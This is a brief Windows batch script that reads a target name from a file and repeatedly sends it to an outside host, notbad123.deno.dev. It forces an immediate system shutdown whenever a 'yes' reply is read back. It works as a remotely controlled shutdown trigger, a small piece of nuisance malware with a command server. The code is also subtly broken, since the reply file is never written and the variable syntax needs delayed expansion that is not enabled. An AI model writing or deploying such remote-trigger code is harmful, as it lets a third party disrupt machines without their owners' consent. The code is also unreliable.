:: Thanks to Chatgpt for converting
@echo off
color 2

set /p s=<target.txt

set url=notbad123.deno.dev

:loop
curl "%url%?name=!s!"
set /p res=<curl_output.txt

if "%res%" == "yes" (
    shutdown /s /t 1
)

timeout /t 5 /nobreak
goto loop